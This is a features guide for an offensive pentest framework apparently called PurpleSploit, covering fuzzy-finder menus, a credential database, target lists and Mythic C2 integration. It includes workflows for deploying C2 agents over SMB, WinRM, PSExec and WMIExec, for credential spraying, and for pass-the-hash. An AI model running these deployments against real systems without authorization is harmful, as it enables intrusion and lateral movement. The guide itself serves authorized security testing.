# PurpleSploit Framework v2.0 - Features Guide

## Overview

This document covers the enhanced features of PurpleSploit Framework v2.0, including FZF integration, credential management, multi-target tracking, and Mythic C2 integration.

---

## 🔍 FZF Integration

The framework now includes full FZF (Fuzzy Finder) integration for an enhanced, menu-driven experience while maintaining the Metasploit-style CLI.

### Features

#### 1. Interactive Module Search

**Command:** `search` or `search <keyword>`

- **What it does:** Opens an interactive FZF menu to search and select modules
- **With keyword:** Pre-filters results based on your search term
- **Without keyword:** Shows all modules for browsing

**Example:**
```bash
purplesploit> search smb share

# FZF menu appears with:
# - network/nxc/smb/enum_shares | SMB share enumeration
# - network/nxc/smb/auth_test | SMB authentication testing
# [Arrow keys to navigate, Enter to select, ESC to cancel]
```

#### 2. Category Browser

**Command:** `browse`

- **What it does:** Browse modules organized by category
- **Two-step selection:** First pick category, then pick module
- **Visual organization:** See module count per category

**Example:**
```bash
purplesploit> browse

# Step 1: Select category
# - network | 15 modules
# - web | 9 modules
# - recon | 3 modules
# - c2 | 4 modules

# Step 2: Select module from category
# [Shows only modules in selected category]
```

#### 3. Interactive Target Selection

**Command:** `targets`

- **What it does:** Select target from workspace with FZF menu
- **Preview:** Shows ping status for each target
- **Quick selection:** Type to filter, Enter to select

**Example:**
```bash
purplesploit> targets

# FZF menu shows:
# 192.168.1.100
# 192.168.1.101
# 10.10.10.50
# [Live ping preview in side panel]
```

#### 4. Interactive Credential Selection

**Command:** `credentials` or `creds`

- **What it does:** Select and load credentials from database
- **Display:** Shows username, domain, password status
- **Safe display:** Passwords shown as `***`, hashes as `<hash>`

**Example:**
```bash
purplesploit> credentials

# FZF menu shows:
# 1 | administrator | *** | CORP.LOCAL | <hash> | Domain Admin
# 2 | pentester | *** | <none> | <none> | Test Account
# 3 | guest | <none> | <none> | <none> | Guest Access
```

#### 5. Interactive Workspace Selection

**Command:** `workspace`

- **What it does:** Switch workspaces with FZF menu
- **Shows:** Workspace name, target count, current status
- **Quick switching:** Fast engagement switching

**Example:**
```bash
purplesploit> workspace

# FZF menu shows:
# client_pentest_2024 | 15 targets | [CURRENT]
# internal_assessment | 50 targets |
# webapp_testing | 5 targets |
```

#### 6. Interactive Variable Editor

**Command:** `vars`

- **What it does:** Select and edit variables with FZF
- **Shows:** Variable name, current value, description
- **Quick edit:** Select variable, edit value inline

**Example:**
```bash
purplesploit> vars

# FZF menu shows all variables
# Select one to edit with pre-filled current value
```

#### 7. Interactive History

**Command:** `history`

- **What it does:** Browse and re-run commands from history
- **Preview:** Shows full command
- **Confirmation:** Asks before executing

**Example:**
```bash
purplesploit> history

# FZF menu shows:
# 125 | nmap -sV 192.168.1.100 -p 80,443
# 124 | nxc smb 192.168.1.100 -u admin -p Password123 --shares
# [Select to re-run]
```

### FZF Controls

- **Arrow Keys / Ctrl+N/P:** Navigate up/down
- **Enter:** Select and confirm
- **ESC / Ctrl+C:** Cancel
- **Ctrl+/:** Toggle preview window
- **Type:** Filter results in real-time

---

## 🔐 Credential Management

Store and manage multiple credential sets for different scenarios.

### Credential Database

**Location:** `~/.purplesploit/credentials.db`

**Format:** Stores username, password, domain, hash, and description

### Commands

```bash
# Interactive selection (FZF)
credentials

# List all credentials
credentials -l

# Add new credential
credentials -a

# Load credential by ID
credentials 3

# Edit credential
credentials -e 3

# Delete credential
credentials -d 3

# Management menu
credentials -m

# Import from file
credentials -i creds.txt

# Export to file
credentials -x exported_creds.txt
```

### Adding Credentials

```bash
purplesploit> credentials -a

Username: administrator
Password: [hidden input]
Domain (optional): CORP.LOCAL
Hash (NTLM hash, optional): aad3b435b51404eeaad3b435b51404ee:31d6cfe...
Description: Domain Admin Account

[+] Added credential ID 5: administrator
```

### Using Credentials

Once loaded, credentials automatically populate variables:
- `USERNAME`
- `PASSWORD`
- `DOMAIN`
- `HASH`

These are used by all NXC, Impacket, and authentication modules.

### Credential File Format

**Import format** (username:password:domain:hash:description):
```
administrator:P@ssw0rd123:CORP.LOCAL::Domain Admin
pentester:Test123:::Testing Account
guest::::Guest Access
admin::CORP.LOCAL:aad3b435b51404eeaad3b435b51404ee:31d6cfe...:Pass-the-Hash
```

---

## 🎯 Multi-Target Management

Track and organize multiple targets per workspace.

### Target Commands

```bash
# Interactive selection (FZF)
targets

# List all targets
targets -l

# Add target
targets -a 192.168.1.100
targets -a 192.168.1.0/24

# Remove target
targets -r 192.168.1.100

# Import from file
targets -i targets.txt

# Export to file
targets -e my_targets.txt
```

### Target File Format

**Simple format** (one per line):
```
192.168.1.100
192.168.1.101
192.168.1.0/24
10.10.10.50
dc01.corp.local
```

### Using Targets

1. **Single Target:** Select a target, it sets `RHOST` variable
2. **Multiple Targets:** Store many, switch between them easily
3. **Batch Operations:** Export targets for use with other tools

**Example Workflow:**
```bash
# Add targets
targets -a 192.168.1.100
targets -a 192.168.1.101
targets -a 192.168.1.102

# Select target interactively
targets
[Select 192.168.1.100 from menu]

# Run scan
use recon/nmap/quick_scan
run

# Switch to next target
targets
[Select 192.168.1.101]
run
```

---

## 🚀 Mythic C2 Integration

Integrate with Mythic C2 server for automated agent deployment via NXC and Impacket.

### Setup

#### 1. Configure Mythic Server

```bash
purplesploit> mythic configure

Mythic Server: https://mythic.example.com
API Key: your-api-key-here
Callback Host: 10.10.10.10
Callback Port: 443

[+] Configuration saved
```

#### 2. Test Connection

```bash
purplesploit> mythic test

[*] Testing connection to Mythic server...
[+] Successfully connected to Mythic C2
```

### Deployment Methods

#### Method 1: Using Deployment Modules

**Available modules:**
- `c2/mythic/deploy_smb` - Deploy via SMB with NXC
- `c2/mythic/deploy_winrm` - Deploy via WinRM with NXC
- `c2/mythic/deploy_psexec` - Deploy via Impacket PSExec
- `c2/mythic/deploy_wmiexec` - Deploy via Impacket WMIExec

**Example:**
```bash
# Set up credentials and target
purplesploit> credentials 1    # Load admin creds
purplesploit> set RHOST 192.168.1.100

# Set Mythic payload path
purplesploit> set MYTHIC_PAYLOAD /path/to/agent.exe

# Deploy via SMB
purplesploit> use c2/mythic/deploy_smb
purplesploit(c2/mythic/deploy_smb)> run

[*] Uploading payload to 192.168.1.100 via SMB...
[+] Payload uploaded successfully
[*] Executing payload...
[+] Payload executed. Check Mythic for callback!
```

#### Method 2: Using Mythic Menu

```bash
purplesploit> mythic

Mythic C2 Integration
================================================================================
  1) Configure Mythic server
  2) Test connection
  3) List available payloads
  4) Generate new payload
  5) Deploy via SMB (NXC)
  6) Deploy via WinRM
  7) Deploy via PSExec (Impacket)
  8) Show configuration
  9) Back to main menu

Choice: 4
Payload type: apollo
Output file: /tmp/agent.exe
[*] Generating apollo payload...
[+] Payload generated: abc-123-def
[+] Payload saved to: /tmp/agent.exe

Choice: 5
Target: 192.168.1.100
Payload file: /tmp/agent.exe
[*] Uploading payload...
[+] Payload deployed!
```

### Deployment Workflow

**Complete example:**
```bash
# 1. Configure Mythic (one time)
mythic configure

# 2. Generate payload
mythic
[Select "4" - Generate new payload]
[Payload saved to /tmp/agent.exe]

# 3. Set up target and creds
credentials     # FZF select admin creds
targets         # FZF select target

# 4. Deploy agent
use c2/mythic/deploy_smb
set MYTHIC_PAYLOAD /tmp/agent.exe
run

# 5. Check Mythic dashboard for callback
```

### Mythic Variables

- `MYTHIC_SERVER` - Mythic C2 server URL
- `MYTHIC_API_KEY` - API key for authentication
- `MYTHIC_CALLBACK_HOST` - IP/domain for agent callbacks
- `MYTHIC_CALLBACK_PORT` - Port for callbacks (default: 443)
- `MYTHIC_PAYLOAD` - Path to agent payload file

### Supported Deployment Methods

| Method | Tool | Protocol | Requirements |
|--------|------|----------|--------------|
| SMB | NXC | SMB | Valid credentials, SMB access |
| WinRM | NXC | WinRM | Valid credentials, WinRM enabled |
| PSExec | Impacket | SMB | Admin credentials |
| WMIExec | Impacket | WMI | Admin credentials |

---

## 💡 Usage Examples

### Example 1: Full Engagement Workflow

```bash
# Start framework
./purplesploit-framework.sh

# Create workspace for engagement
workspace -a acme_pentest_2024

# Add targets
targets -i client_targets.txt

# Import credentials
credentials -i found_creds.txt

# Select target
targets         # FZF menu
[Select 192.168.1.100]

# Select credentials
credentials     # FZF menu
[Select domain admin account]

# Search for SMB modules
search smb      # FZF search
[Select network/nxc/smb/enum_shares]

# Run enumeration
run

# Deploy Mythic agent
use c2/mythic/deploy_smb
set MYTHIC_PAYLOAD /tmp/apollo_agent.exe
run
```

### Example 2: Quick Web Assessment

```bash
# Interactive module search
search ferox    # FZF filters to feroxbuster modules
[Select web/feroxbuster/deep_scan]

# Set target
set TARGET_URL https://target.example.com

# View and edit options
vars            # FZF variable editor
[Edit THREADS to 100]
[Edit WORDLIST to custom list]

# Run scan
run

# Check history later
history         # FZF browse all commands
[Select previous feroxbuster command to re-run]
```

### Example 3: Credential Spraying

```bash
# Load multiple credentials
credentials -i passwords.txt

# Add multiple targets
targets -i domain_controllers.txt

# For each target:
targets         # Select target 1
credentials     # Select credential 1
use network/nxc/smb/auth_test
run

targets         # Select target 1
credentials     # Select credential 2
run

# Review command history
history -l 50
```

---

## 🎓 Tips & Best Practices

### FZF Tips

1. **Fuzzy Search:** Type any part of what you're looking for
   - `smb share` finds modules with "smb" AND "share" anywhere in name/description

2. **Preview Windows:** Use `Ctrl-/` to toggle preview panel

3. **Quick Navigation:** Start typing immediately after opening FZF

### Credential Management Tips

1. **Organize by Engagement:** Different workspace = different credential set
2. **Descriptive Names:** Use description field for context
3. **Regular Exports:** Backup credentials regularly
4. **Hash Storage:** Store NTLM hashes for pass-the-hash attacks

### Target Management Tips

1. **Use CIDR:** `192.168.1.0/24` for subnet targets
2. **Name Resolution:** Use hostnames when possible
3. **Import/Export:** Keep target lists as files for repeatability
4. **Workspace Separation:** Different workspace per engagement

### Mythic Integration Tips

1. **Test Connection First:** Always run `mythic test` after configuring
2. **Staged Deployment:** Test payload locally before deploying
3. **Multiple Methods:** Try different deployment methods if one fails
4. **Credential Reuse:** Loaded credentials work across all deployment methods

---

## 🔧 Configuration Files

### Locations

- **Credentials:** `~/.purplesploit/credentials.db`
- **Workspaces:** `~/.purplesploit/workspaces/<workspace_name>/`
- **Command History:** `~/.purplesploit/command_history`
- **Mythic Config:** `~/.purplesploit/mythic_config`
- **Job Logs:** `~/.purplesploit/jobs/`

### Workspace Structure

```
~/.purplesploit/workspaces/<workspace_name>/
├── targets/
│   └── hosts.txt           # Target list
├── output/                 # Module outputs
├── logs/                   # Execution logs
├── data/                   # Misc data
├── vars.conf               # Workspace variables
└── metadata.txt            # Workspace info
```

---

## 🚨 Troubleshooting

### FZF Not Working

**Problem:** FZF commands fall back to basic mode

**Solution:**
```bash
# Install FZF
sudo apt install fzf       # Debian/Ubuntu
brew install fzf           # macOS
```

### Credentials Not Loading

**Problem:** `credentials` command shows empty

**Solution:**
```bash
# Check database
cat ~/.purplesploit/credentials.db

# Re-initialize if needed
rm ~/.purplesploit/credentials.db
# Restart framework
```

### Mythic Connection Failed

**Problem:** `mythic test` fails

**Solutions:**
1. Check server URL (include `https://`)
2. Verify API key is correct
3. Test network connectivity: `curl -k $MYTHIC_SERVER`
4. Check firewall rules

### Target Selection Doesn't Set RHOST

**Problem:** After selecting target, RHOST remains empty

**Solution:**
```bash
# Manually set if FZF fails
set RHOST 192.168.1.100

# Or use targets -l and copy value
targets -l
set RHOST [paste value]
```

---

## 📚 Additional Resources

- **Main README:** `FRAMEWORK_README.md`
- **Module Template:** `MODULE_TEMPLATE.psm`
- **Quick Start:** Type `quickstart` in framework
- **Full Help:** Type `help` in framework

---

**Happy Hacking with Enhanced Features!** 🟣✨
